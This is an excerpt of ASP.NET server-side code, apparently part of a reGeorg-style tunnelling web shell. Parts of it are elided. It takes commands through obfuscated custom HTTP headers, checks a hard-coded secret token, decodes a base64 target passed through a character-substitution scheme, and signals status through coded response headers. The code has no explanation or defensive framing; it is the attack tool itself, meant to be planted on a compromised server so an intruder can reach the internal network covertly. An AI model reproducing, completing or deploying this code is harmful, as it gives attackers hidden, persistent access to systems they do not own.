...
<%
    try
    {
        ...
        String rUrl = Request.Headers.Get("Vakzngeuc");
        if (rUrl != null){
        ...
        String cmd = Request.Headers.Get("Reggnqscnglychtxb");
        if (cmd != null) {
            String mark = cmd.Substring(0,22);
            cmd = cmd.Substring(22);
            if (cmd == "FNUoY22YWoKaBgORA4gQ5JBpZ061PAGguz3lX376oGttSdtWr6Lan") {
                try {
                    String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get("Brguhxiky"), de, en)));
                    ...
                    Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                } catch (Exception ex) {
                    Response.AddHeader("Tptgrfds", "g3sqinm3KJYZWM2Cpgrm9TofGcTfl3kHEMcwcLOqPvFnVLpN0v");
                    Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
                }
                ...
                try {
                    ...
                    Response.AddHeader("Tptgrfds", "djsMDIayrozCP20a9RJe_CkL3T4ZtgYFMJyclQA5zhwh_MGynFt2H");
                    Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
                }
            ...
            Response.Write("<!-- Bemlc3JMD6S5X5Q_qIXJ -->");
        }
    } catch (Exception ex) {
        Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
    }
